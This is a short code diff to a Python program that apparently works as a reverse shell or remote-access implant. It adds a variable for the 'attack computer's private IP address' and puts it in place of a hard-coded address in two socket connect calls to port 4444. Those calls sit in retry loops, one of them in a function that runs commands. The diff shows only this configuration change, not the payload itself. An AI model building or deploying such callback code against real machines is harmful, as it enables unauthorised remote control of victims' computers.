@@ -25,6 +25,10 @@ from subprocess import DEVNULL
 from subprocess import call
 
 
+# Set this variable to the attack computers private IP address
+# Instructions for this can be found in the README.md file
+set_private_ip = ""
+
 def imports():
     try:
         import datetime
@@ -310,7 +314,7 @@ connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 while True:
     time.sleep(3)
     try:
-        connection.connect(("192.168.1.64", 4444))
+        connection.connect((set_private_ip, 4444))
         break
     except Exception as e:
         print(e)
@@ -482,7 +486,7 @@ def run_commands():
         while True:
             time.sleep(3)
             try:
-                connection.connect(("192.168.1.64", 4444))
+                connection.connect((set_private_ip, 4444))
                 break
             except Exception as e:
                 print(e)
